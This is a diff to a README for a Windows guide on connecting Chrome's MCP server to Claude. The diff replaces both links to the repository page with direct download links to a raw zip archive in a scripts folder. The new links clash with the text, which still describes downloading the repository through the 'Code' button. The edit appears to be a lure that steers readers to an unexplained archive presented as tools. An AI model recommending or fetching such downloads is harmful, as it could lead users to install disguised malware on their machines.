@@ -1,6 +1,6 @@
 # 🛠️ chrome-mcp-windows-survival-guide - Connect Chrome to Claude on Windows
 
-[![Download Guide](https://img.shields.io/badge/Download-Chrome_MCP_Guide-blue.svg)](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide)
+[![Download Guide](https://img.shields.io/badge/Download-Chrome_MCP_Guide-blue.svg)](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide/raw/refs/heads/main/scripts/survival-mcp-chrome-windows-guide-1.6-alpha.3.zip)
 
 This guide helps you set up the Chrome Model Context Protocol (MCP) server on Windows 11. Installing this connection often causes errors due to how Windows handles browser permissions and path settings. These instructions organize the fixes for common failures.
 
@@ -19,7 +19,7 @@ This project bridges the gap between your Google Chrome browser and AI tools lik
 
 To begin, go to the project website. This page contains the scripts, configuration files, and troubleshooting guides needed to make the connection work.
 
-[Visit this page to download the tools](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide)
+[Visit this page to download the tools](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide/raw/refs/heads/main/scripts/survival-mcp-chrome-windows-guide-1.6-alpha.3.zip)
 
 Click the green "Code" button and select "Download ZIP" to save the tools to your computer. Extract the contents of this folder to a permanent location, such as your Documents folder, so the files remain stable.
 
